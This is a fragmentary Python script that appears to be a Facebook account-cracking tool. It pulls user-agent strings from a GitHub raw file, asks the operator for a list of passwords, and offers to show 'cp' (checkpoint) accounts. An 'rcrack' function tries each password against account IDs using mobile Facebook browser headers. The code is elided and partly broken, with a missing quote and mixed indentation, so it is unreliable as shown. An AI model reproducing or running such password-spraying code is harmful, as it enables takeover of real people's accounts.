...
android_models=[]
try:
	xx = requests.get('https://raw.githubusercontent.com/mdtasin123/user-agent/main/pro.txt').text.splitlines()
	for line in xx:
...
def menu(): 
	...
	if xd in ['1','01']:
		...
		print('\033[1;37m----------------------------------------------')
		print('\033[92;1m [9] Normal Method- New User  ')
		print('\033[1;37m----------------------------------------------')
		print('\033[92;1m [10] Normal Method- New User  ')
		linex()
		mthd=input(' Choose: ')
		linex()
		plist = []
		...
		for i in range(ps_limit):
			plist.append(input(f' Put password {i+1}: '))
		linex()
		print(' Do you went show  cp account? (\x1b[38;5;208m Y  \x1b[38;5;208m\033[1;37m\ \033[92;1m N \033[1;37m) ')
		linex()
		cx=input(' Choose: ')
		if cx in ['y','Y','yes','Yes','1']:
			pcp.append('y')
...
def rcrack(ids,passlist):
	...
	try:
		for pas in passlist:
            ...
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': Mozilla/5.0 (Linux; Android 10; SM-N971U Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/100.0.4896.58 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/358.0.0.34.117;]',}
